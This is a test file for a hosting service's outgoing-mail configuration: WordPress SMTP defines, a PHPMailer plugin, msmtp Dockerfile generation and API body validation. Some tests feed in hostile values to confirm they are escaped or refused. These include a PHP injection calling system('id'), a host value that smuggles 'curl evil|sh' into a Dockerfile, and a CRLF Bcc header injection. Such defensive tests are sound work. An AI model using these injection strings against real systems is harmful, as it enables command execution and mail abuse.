/**
 * Outgoing mail for customer websites: generated config (wp-config defines,
 * mu-plugin, msmtp Dockerfile lines) and request validation.
 */
import { describe, it, expect } from 'bun:test'
import crypto from 'crypto'
import {
  cleanFromName,
  generateSiteMailPassword,
  isSafeEmail,
  msmtpDockerfileBlock,
  parseSiteMailAction,
  phpString,
  siteMailContainerEnv,
  siteMailLocalPart,
  wordPressMailDefines,
  WP_MAIL_PLUGIN,
  WP_MAIL_PLUGIN_PATH,
  type SiteMailRuntime,
} from '@/lib/site-mail-config'
import { containerTestScript } from '@/lib/site-mail'

const rt: SiteMailRuntime = {
  host: 'mail.apsamo.test',
  port: 587,
  user: 'site-shop@apsamo.test',
  password: 'Abc123xyz',
  from: 'shop@customer.test',
  fromName: "Bob's Shop",
}

describe('site mailbox naming and secrets', () => {
  it('builds a safe local part of at most 64 characters', () => {
    expect(siteMailLocalPart('My Shop!')).toBe('site-my-shop')
    expect(siteMailLocalPart('')).toBe('site-site')
    const long = siteMailLocalPart('a'.repeat(200), 'ab12cd')
    expect(long.length).toBeLessThanOrEqual(64)
    expect(long.endsWith('-ab12cd')).toBe(true)
    expect(siteMailLocalPart('x--'.repeat(40)).endsWith('-')).toBe(false)
  })

  it('generates 32-character alphanumeric passwords that differ', () => {
    const a = generateSiteMailPassword((m) => crypto.randomInt(m))
    const b = generateSiteMailPassword((m) => crypto.randomInt(m))
    expect(a).toMatch(/^[A-Za-z0-9]{32}$/)
    expect(a).not.toBe(b)
  })

  it('accepts ordinary addresses and refuses ones that would need quoting', () => {
    expect(isSafeEmail('info@shop.example.com')).toBe(true)
    expect(isSafeEmail("o'neil@x.com")).toBe(false)
    expect(isSafeEmail('a b@x.com')).toBe(false)
    expect(isSafeEmail('a@x')).toBe(false)
    expect(isSafeEmail('a..b@x.com')).toBe(false)
  })
})

describe('WordPress config', () => {
  it('writes no constants when mail is off (the plugin then does nothing)', () => {
    expect(wordPressMailDefines(null)).toBe('')
  })

  it('writes every constant the plugin reads, as escaped PHP literals', () => {
    const d = wordPressMailDefines(rt)
    expect(d).toContain("define('APSAMO_SMTP_HOST', 'mail.apsamo.test');")
    expect(d).toContain("define('APSAMO_SMTP_PORT', 587);")
    expect(d).toContain("define('APSAMO_SMTP_USER', 'site-shop@apsamo.test');")
    expect(d).toContain("define('APSAMO_SMTP_PASS', 'Abc123xyz');")
    expect(d).toContain("define('APSAMO_SMTP_FROM', 'shop@customer.test');")
    expect(d).toContain("define('APSAMO_SMTP_FROM_NAME', 'Bob\\'s Shop');")
  })

  it('escapes PHP single-quoted strings so a value cannot end the literal', () => {
    expect(phpString("a'b\\c")).toBe("'a\\'b\\\\c'")
    expect(phpString("x\\'); system('id'); //")).toBe("'x\\\\\\'); system(\\'id\\'); //'")
  })

  it('ships a must-use plugin that configures PHPMailer from constants only', () => {
    expect(WP_MAIL_PLUGIN_PATH).toBe('wp-content/mu-plugins/apsamo-mail.php')
    expect(WP_MAIL_PLUGIN.startsWith('<?php')).toBe(true)
    expect(WP_MAIL_PLUGIN).toContain("add_action('phpmailer_init'")
    expect(WP_MAIL_PLUGIN).toContain('$phpmailer->isSMTP();')
    expect(WP_MAIL_PLUGIN).toContain('$phpmailer->Password = APSAMO_SMTP_PASS;')
    expect(WP_MAIL_PLUGIN).toContain("? 'ssl' : 'tls'")
    expect(WP_MAIL_PLUGIN).toContain('$phpmailer->Sender = APSAMO_SMTP_USER;')
    // Inert without configuration, and nothing secret hard-coded.
    expect(WP_MAIL_PLUGIN).toContain("if (!defined('APSAMO_SMTP_HOST')")
    expect(WP_MAIL_PLUGIN).not.toContain('apsamo.test')
    // Brace balance as a cheap syntax guard (no PHP binary in CI).
    const opens = (WP_MAIL_PLUGIN.match(/\{/g) || []).length
    const closes = (WP_MAIL_PLUGIN.match(/\}/g) || []).length
    expect(opens).toBe(closes)
  })

  it('test scripts read the recipient from the environment, not the command line', () => {
    for (const m of ['wordpress', 'php'] as const) {
      const s = containerTestScript(m)
      expect(s).toContain("getenv('APSAMO_TEST_TO')")
      expect(s).toContain('APSAMO_MAIL_OK')
    }
    expect(containerTestScript('wordpress')).toContain('wp_mail(')
  })
})

describe('PHP (msmtp) image', () => {
  it('adds nothing when mail is off', () => {
    expect(msmtpDockerfileBlock(null)).toBe('')
    expect(siteMailContainerEnv(null)).toEqual({})
  })

  it('installs msmtp, points sendmail_path at it and keeps the password out of the image', () => {
    const b = msmtpDockerfileBlock(rt)
    expect(b).toContain('apt-get install -y --no-install-recommends msmtp ca-certificates')
    expect(b).toContain("'host mail.apsamo.test'")
    expect(b).toContain("'port 587'")
    expect(b).toContain("'tls_starttls on'")
    expect(b).toContain("'user site-shop@apsamo.test'")
    expect(b).toContain("'from shop@customer.test'")
    expect(b).toContain('passwordeval "printenv APSAMO_SMTP_PASS"')
    expect(b).toContain('sendmail_path = "/usr/bin/msmtp -t -i"')
    expect(b).toContain('ge 1.8.8')
    expect(b).not.toContain(rt.password)
    // Every RUN is a single physical line (see phpIniBlock).
    for (const line of b.split('\n').filter((l) => l.startsWith('RUN'))) expect(line).not.toContain('\\\n')
    expect(siteMailContainerEnv(rt)).toEqual({ APSAMO_SMTP_PASS: 'Abc123xyz' })
  })

  it('uses implicit TLS on 465', () => {
    expect(msmtpDockerfileBlock({ ...rt, port: 465 })).toContain("'tls_starttls off'")
  })

  it('refuses to interpolate unsafe values into the Dockerfile', () => {
    const bad = msmtpDockerfileBlock({ ...rt, host: "mail.x.com'; curl evil|sh; '" })
    expect(bad).not.toContain('RUN')
    expect(msmtpDockerfileBlock({ ...rt, from: "a'b@x.com" })).not.toContain('RUN')
  })
})

describe('POST /api/hosting/[id]/mail body validation', () => {
  it('accepts the four actions', () => {
    expect(parseSiteMailAction({ action: 'test' })).toEqual({ action: 'test' })
    expect(parseSiteMailAction({ action: 'disable' })).toEqual({ action: 'disable' })
    expect(parseSiteMailAction({ action: 'rotate' })).toEqual({ action: 'rotate' })
    expect(parseSiteMailAction({ action: 'enable' })).toEqual({ action: 'enable' })
  })

  it('normalises and validates From fields', () => {
    expect(parseSiteMailAction({ action: 'enable', fromAddress: ' Info@Shop.Test ', fromName: ' Shop ' })).toEqual({
      action: 'enable',
      fromAddress: 'info@shop.test',
      fromName: 'Shop',
    })
    expect(parseSiteMailAction({ action: 'enable', fromAddress: null, fromName: '' })).toEqual({
      action: 'enable',
      fromAddress: null,
      fromName: null,
    })
  })

  it('rejects bad input', () => {
    for (const body of [
      null,
      [],
      'enable',
      {},
      { action: 'delete' },
      { action: 'test', to: 'someone@else.com' },
      { action: 'enable', fromAddress: 'not-an-email' },
      { action: 'enable', fromAddress: 42 },
      { action: 'enable', fromName: 'Evil\r\nBcc: x@y.com' },
      { action: 'enable', fromName: 'a'.repeat(101) },
      { action: 'enable', password: 'x' },
    ]) {
      expect(() => parseSiteMailAction(body)).toThrow()
    }
    expect(() => cleanFromName('<script>')).toThrow()
  })
})
